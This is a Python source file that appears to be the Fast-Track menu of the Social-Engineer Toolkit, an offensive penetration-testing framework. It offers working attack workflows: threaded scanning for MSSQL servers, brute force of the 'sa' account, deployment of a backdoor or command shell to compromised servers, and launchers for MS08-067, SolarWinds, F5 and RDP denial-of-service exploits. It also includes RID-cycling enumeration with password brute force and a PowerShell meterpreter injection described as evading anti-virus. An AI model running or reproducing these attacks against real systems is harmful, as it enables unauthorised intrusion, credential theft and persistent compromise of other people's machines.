#!/usr/bin/env python
from src.core.setcore import *
from src.core.menu import text
import subprocess
from multiprocessing.dummy import Pool as ThreadPool 
definepath = os.getcwd()

try: input = raw_input
except: pass

#
#
# Fast-Track Main options and interface menus
#
#
try:
    while 1:
        #
        # USER INPUT: SHOW WEB ATTACK MENU         #
        #

        create_menu(text.fasttrack_text, text.fasttrack_menu)
        attack_vector = raw_input(setprompt(["19"], ""))

        if attack_vector == "99" or attack_vector == "quit" or attack_vector == "exit":
            break

        #
        #
        # mssql_scanner
        #
        #
        if attack_vector == "1":
            # start the menu
            create_menu(text.fasttrack_mssql_text1, text.fasttrack_mssql_menu1)
            # take input here
            attack_vector_sql = raw_input(setprompt(["19", "21"], ""))

            #
            # option 1 scan and attack, option 2 connect directly to mssql
            # if 1, start scan and attack
            #
            if attack_vector_sql == '1':
                print(
                    "\nHere you can select either a CIDR notation/IP Address or a filename\nthat contains a list of IP Addresses.\n\nFormat for a file would be similar to this:\n\n192.168.13.25\n192.168.13.26\n192.168.13.26\n\n1. Scan IP address or CIDR\n2. Import file that contains SQL Server IP addresses\n")
                choice = raw_input(
                    setprompt(["19", "21", "22"], "Enter your choice (ex. 1 or 2) [1]"))
                if choice != "1":
                    if choice != "2":
                        if choice != "":
                            print_error(
                                "You did not specify 1 or 2! Please try again.")
                            choice = raw_input(
                                setprompt(["19", "21", "22"], "Enter your choice (ex. 1 or 2) [1]"))
                # grab ip address
                if choice == "":
                    choice = "1"
                if choice == "1":
                    range = raw_input(setprompt(
                        ["19", "21", "22"], "Enter the CIDR, single IP, or multiple IPs seperated by space (ex. 192.168.1.1/24)"))
                if choice == "2":
                    while 1:
                        range = raw_input(setprompt(
                            ["19", "21", "22"], "Enter filename for SQL servers (ex. /root/sql.txt - note can be in format of ipaddr:port)"))
                        if not os.path.isfile(range):
                            print_error(
                                "File not found! Please type in the path to the file correctly.")
                        else:
                            break
                if choice == "1":
                    port = "1433"
                if choice == "2":
                    port = "1433"
                # ask for a wordlist
                wordlist = raw_input(setprompt(
                    ["19", "21", "22"], "Enter path to a wordlist file [use default wordlist]"))
                if wordlist == "":
                    wordlist = "default"
                # specify the user to brute force
                username = raw_input(setprompt(
                    ["19", "21", "22"], "Enter the username to brute force or specify username file (/root/users.txt) [sa]"))
                # default to sa
                if username == "":
                    username = "sa"
                if username != "sa":
                    if not os.path.isfile(username):
                        print_status(
                            "If you were using a file, its not found, using text as username.")
                # import the mssql module from fasttrack
                from src.fasttrack import mssql
                # choice from earlier if we want to use a filelist or whatnot
                if choice != "2":
                    # sql_servers
                    sql_servers = ''
                    print_status("Hunting for SQL servers.. This may take a little bit.")
                    if "/" or " " in str(range):
                        if "/" in str(range):
                            iprange = printCIDR(range)
                            iprange = iprange.split(",")
                            pool = ThreadPool(200)
                            sqlport = pool.map(get_sql_port, iprange)
                            pool.close()
                            pool.join()
                            for sql in sqlport:
                                if sql != None:
                                    if sql != "":
                                        sql_servers = sql_servers + sql + ","

                        else:
                            range1 = range.split(" ")
                            for ip in range1:
                                sqlport = get_sql_port(ip)
                                if sqlport != None:
                                    if sqlport != "":
                                        sql_servers = sql_servers + sqlport + ","

                    else:
                        # use udp discovery to get the SQL server UDP 1434
                        sqlport = get_sql_port(range)
                        # if its not closed then check nmap - if both fail then
                        # nada
                        if sqlport != None:
                            if sqlport != "":
                                sql_servers = sqlport + ","

                # specify choice 2
                if choice == "2":
                    if not os.path.isfile(range):
                        while 1:
                            print_warning(
                                "Sorry boss. The file was not found. Try again")
                            range = raw_input(setprompt(
                                ["19", "21", "22"], "Enter the CIDR, single, IP, or file with IP addresses (ex. 192.168.1.1/24)"))
                            if os.path.isfile(range):
                                print_status(
                                    "Atta boy. Found the file this time. Moving on.")
                                break

                    fileopen = open(range, "r").readlines()
                    sql_servers = ""
                    for line in fileopen:
                        line = line.rstrip()
                        sql_servers = sql_servers + line + ","

                # this will hold all of the SQL servers eventually
                master_list = ""
                # set a base counter
                counter = 0
                # if we specified a username list
                if os.path.isfile(username):
                    usernames = open(username, "r")

                if sql_servers != False:
                    # get rid of extra data from port scanner
                    sql_servers = sql_servers.replace(":%s OPEN" % (port), "")
                    # split into tuple for different IP address
                    sql_servers = sql_servers.split(",")
                    # start loop and brute force

                    print_status("The following SQL servers and associated ports were identified:\n")
                    for sql in sql_servers:
                        if sql != "":
                            print(sql)

                    if len(sql_servers) > 2:
                        print_status("By pressing enter, you will begin the brute force process on all SQL accounts identified in the list above.")
                        test = input("Press {enter} to begin the brute force process.")
                    for servers in sql_servers:

                        # this will return the following format ipaddr + "," +
                        # username + "," + str(port) + "," + passwords
                        if servers != "":
                            # if we aren't using a username file
                            if not os.path.isfile(username):
                                sql_success = mssql.brute(
                                    servers, username, port, wordlist)
                                if sql_success != False:
                                # after each success or fail it will break
                                # into this to the above with a newline to
                                # be parsed later
                                    master_list = master_list + \
                                        sql_success + ":"
                                    counter = 1

                            # if we specified a username list
                            if os.path.isfile(username):
                                for users in usernames:
                                    users = users.rstrip()
                                    sql_success = mssql.brute(
                                        servers, users, port, wordlist)
                                    # we wont break out of the loop here incase
                                    # theres multiple usernames we want to find
                                    if sql_success != False:
                                        master_list = master_list + \
                                            sql_success + ":"
                                        counter = 1

                # if we didn't successful attack one
                if counter == 0:
                    if sql_servers:
                        print_warning(
                            "Sorry. Unable to locate or fully compromise a MSSQL Server on the following SQL servers: ")

                    else:
                        print_warning(
                            "Sorry. Unable to find any SQL servers to attack.")
                    pause = raw_input(
                        "Press {return} to continue to the main menu.")
                # if we successfully attacked one
                if counter == 1:
                    # need to loop to keep menu going
                    while 1:
                        # set a counter to show compromised servers
                        counter = 1
                        # here we list the servers we compromised
                        master_names = master_list.split(":")
                        print_status(
                            "SET Fast-Track attacked the following SQL servers: ")
                        for line in sql_servers:
                            if line != "":
                                print("SQL Servers: " + line.rstrip())
                        print_status(
                            "Below are the successfully compromised systems.\nSelect the compromise SQL server you want to interact with:\n")
                        for success in master_names:
                            if success != "":
                                success = success.rstrip()
                                success = success.split(",")
                                success = bcolors.BOLD + success[0] + bcolors.ENDC + "   username: " + bcolors.BOLD + "%s" % (success[1]) + bcolors.ENDC + " | password: " + bcolors.BOLD + "%s" % (success[
                                    3]) + bcolors.ENDC + "   SQLPort: " + bcolors.BOLD + "%s" % (success[2]) + bcolors.ENDC
                                print("   " + str(counter) + ". " + success)
                                # increment counter
                                counter = counter + 1

                        print("\n   99. Return back to the main menu.\n")
                        # select the server to interact with
                        select_server = raw_input(
                            setprompt(["19", "21", "22"], "Select the SQL server to interact with [1]"))
                        # default 1
                        if select_server == "quit" or select_server == "exit":
                            break
                        if select_server == "":
                            select_server = "1"
                        if select_server == "99":
                            break
                        counter = 1
                        for success in master_names:
                            if success != "":
                                success = success.rstrip()
                                success = success.split(",")
                                # if we equal the number used above
                                if counter == int(select_server):
                                # ipaddr + "," + username + "," + str(port) +
                                # "," + passwords
                                    print(
                                        "\nHow do you want to deploy the binary via debug (win2k, winxp, win2003) and/or powershell (vista,win7,2008,2012) or just a shell\n\n   1. Deploy Backdoor to System\n   2. Standard Windows Shell\n\n   99. Return back to the main menu.\n")
                                    option = raw_input(
                                        setprompt(["19", "21", "22"], "Which deployment option do you want [1]"))
                                    if option == "":
                                        option = "1"
                                    # if 99 then break
                                    if option == "99":
                                        break
                                    # specify we are using the fasttrack
                                    # option, this disables some features
                                    filewrite = open(
                                        userconfigpath + "fasttrack.options", "w")
                                    filewrite.write("none")
                                    filewrite.close()
                                    # import fasttrack
                                    if option == "1":
                                        # import payloads for selection and
                                        # prep
                                        mssql.deploy_hex2binary(
                                            success[0], success[2], success[1], success[3])
                                    # straight up connect
                                    if option == "2":
                                        mssql.cmdshell(success[0], success[2], success[
                                                       1], success[3], option)
                                # increment counter
                                counter = counter + 1

            #
            # if we want to connect directly to a SQL server
            #
            if attack_vector_sql == "2":
                sql_server = raw_input(setprompt(
                    ["19", "21", "23"], "Enter the hostname or IP address of the SQL server"))
                sql_port = raw_input(
                    setprompt(["19", "21", "23"], "Enter the SQL port to connect [1433]"))
                if sql_port == "":
                    sql_port = "1433"
                sql_username = raw_input(
                    setprompt(["19", "21", "23"], "Enter the username of the SQL Server [sa]"))
                # default to sa
                if sql_username == "":
                    sql_username = "sa"
                sql_password = raw_input(
                    setprompt(["19", "21", "23"], "Enter the password for the SQL server"))
                print_status("Connecting to the SQL server...")
                # try connecting
                # establish base counter for connection
                counter = 0
                try:
                    import _mssql
                    conn = _mssql.connect(
                        sql_server + ":" + str(sql_port), sql_username, sql_password)
                    counter = 1
                except Exception as e:
                    print(e)
                    print_error("Connection to SQL Server failed. Try again.")
                # if we had a successful connection
                if counter == 1:
                    print_status(
                        "Dropping into a SQL shell. Type quit to exit.")
                    # loop forever
                    while 1:
                        # enter the sql command
                        sql_shell = raw_input("Enter your SQL command here: ")
                        if sql_shell == "quit" or sql_shell == "exit":
                            print_status(
                                "Exiting the SQL shell and returning to menu.")
                            break

                        try:
                            # execute the query
                            sql_query = conn.execute_query(sql_shell)
                            # return results
                            print("\n")
                            for data in conn:
                                data = str(data)
                                data = data.replace("\\n\\t", "\n")
                                data = data.replace("\\n", "\n")
                                data = data.replace("{0: '", "")
                                data = data.replace("'}", "")
                                print(data)
                        except Exception as e:
                            print_warning(
                                "\nIncorrect syntax somewhere. Printing error message: " + str(e))

        #
        #
        # exploits menu
        #
        #
        if attack_vector == "2":
            # start the menu
            create_menu(text.fasttrack_exploits_text1,
                        text.fasttrack_exploits_menu1)
            # enter the exploits menu here
            range = raw_input(
                setprompt(["19", "24"], "Select the number of the exploit you want"))

            # ms08067
            if range == "1":
                try:
                    module_reload(src.fasttrack.exploits.ms08067)
                except:
                    import src.fasttrack.exploits.ms08067

            # firefox 3.6.16
            if range == "2":
                try:
                    module_reload(src.fasttrack.exploits.firefox_3_6_16)
                except:
                    import src.fasttrack.exploits.firefox_3_6_16
            # solarwinds
            if range == "3":
                try:
                    module_reload(src.fasttrack.exploits.solarwinds)
                except:
                    import src.fasttrack.exploits.solarwinds

            # rdp DoS
            if range == "4":
                try:
                    module_reload(src.fasttrack.exploits.rdpdos)
                except:
                    import src.fasttrack.exploits.rdpdos

            if range == "5":
                try:
                    module_reload(src.fasttrack.exploits.mysql_bypass)
                except:
                    import src.fasttrack.exploits.mysql_bypass

            if range == "6":
                try:
                    module_reload(src.fasttrack.exploits.f5)
                except:
                    import src.fasttrack.exploits.f5

        #
        #
        # sccm attack menu
        #
        #
        if attack_vector == "3":
            # load sccm attack
            try:
                module_reload(src.fasttrack.sccm.sccm_main)
            except:
                import src.fasttrack.sccm.sccm_main

        #
        #
        # dell drac default credential checker
        #
        #
        if attack_vector == "4":
            # load drac menu
            subprocess.Popen("python %s/src/fasttrack/delldrac.py" %
                             (definepath), shell=True).wait()

        #
        #
        # RID ENUM USER ENUMERATION
        #
        #
        if attack_vector == "5":
            print (""".______       __   _______         _______ .__   __.  __    __  .___  ___.
|   _  \     |  | |       \       |   ____||  \ |  | |  |  |  | |   \/   |
|  |_)  |    |  | |  .--.  |      |  |__   |   \|  | |  |  |  | |  \  /  |
|      /     |  | |  |  |  |      |   __|  |  . `  | |  |  |  | |  |\/|  |
|  |\  \----.|  | |  '--'  |      |  |____ |  |\   | |  `--'  | |  |  |  |
| _| `._____||__| |_______/  _____|_______||__| \__|  \______/  |__|  |__|
                |______|
""")
            print(
                "\nRID_ENUM is a tool that will enumerate user accounts through a rid cycling attack through null sessions. In\norder for this to work, the remote server will need to have null sessions enabled. In most cases, you would use\nthis against a domain controller on an internal penetration test. You do not need to provide credentials, it will\nattempt to enumerate the base RID address and then cycle through 500 (Administrator) to whatever RID you want.")
            print("\n")
            ipaddr = raw_input(
                setprompt(["31"], "Enter the IP address of server (or quit to exit)"))
            if ipaddr == "99" or ipaddr == "quit" or ipaddr == "exit":
                break
            print_status(
                "Next you can automatically brute force the user accounts. If you do not want to brute force, type no at the next prompt")
            dict = raw_input(setprompt(
                ["31"], "Enter path to dictionary file to brute force [enter for built in]"))
            # if we are using the built in one
            if dict == "":
                # write out a file
                filewrite = open(userconfigpath + "dictionary.txt", "w")
                filewrite.write("\nPassword1\nPassword!\nlc username")
                # specify the path
                dict = userconfigpath + "dictionary.txt"
                filewrite.close()

            # if we are not brute forcing
            if dict.lower() == "no":
                print_status("No problem, not brute forcing user accounts")
                dict = ""

            if dict != "":
                print_warning(
                    "You are about to brute force user accounts, be careful for lockouts.")
                choice = raw_input(
                    setprompt(["31"], "Are you sure you want to brute force [yes/no]"))
                if choice.lower() == "n" or choice.lower() == "no":
                    print_status(
                        "Okay. Not brute forcing user accounts *phew*.")
                    dict = ""

            # next we see what rid we want to start
            start_rid = raw_input(
                setprompt(["31"], "What RID do you want to start at [500]"))
            if start_rid == "":
                start_rid = "500"
            # stop rid
            stop_rid = raw_input(
                setprompt(["31"], "What RID do you want to stop at [15000]"))
            if stop_rid == "":
                stop_rid = "15000"
            print_status(
                "Launching RID_ENUM to start enumerating user accounts...")
            subprocess.Popen("python src/fasttrack/ridenum.py %s %s %s %s" %
                             (ipaddr, start_rid, stop_rid, dict), shell=True).wait()

            # once we are finished, prompt.
            print_status("Everything is finished!")
            pause = raw_input("Press {return} to go back to the main menu.")

        #
        #
        # PSEXEC PowerShell
        #
        #
        if attack_vector == "6":
            print(
                "\nPSEXEC Powershell Injection Attack:\n\nThis attack will inject a meterpreter backdoor through powershell memory injection. This will circumvent\nAnti-Virus since we will never touch disk. Will require Powershell to be installed on the remote victim\nmachine. You can use either straight passwords or hash values.\n")
            try:
                module_reload(src.fasttrack.psexec)
            except:
                import src.fasttrack.psexec

# handle keyboard exceptions
except KeyboardInterrupt:
    pass
